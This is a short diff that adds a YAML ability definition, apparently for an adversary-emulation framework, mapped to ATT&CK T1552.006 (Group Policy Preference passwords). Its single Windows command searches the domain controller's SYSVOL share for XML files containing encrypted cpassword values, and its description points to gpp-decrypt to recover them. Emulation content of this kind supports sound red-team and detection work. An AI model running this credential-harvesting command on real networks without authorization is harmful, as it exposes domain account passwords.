@@ -1,0 +1,17 @@
+- description: 'Look for the encrypted cpassword value within Group Policy Preference
+    files on the Domain Controller. This value can be decrypted with gpp-decrypt on
+    Kali Linux.
+
+    '
+  id: 53d863a1-90b4-1b6a-f474-be875b74784b
+  name: GPP Passwords (findstr)
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: findstr /S cpassword %logonserver%\sysvol\*.xml
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1552.006
+    name: 'Unsecured Credentials: Group Policy Preferences'
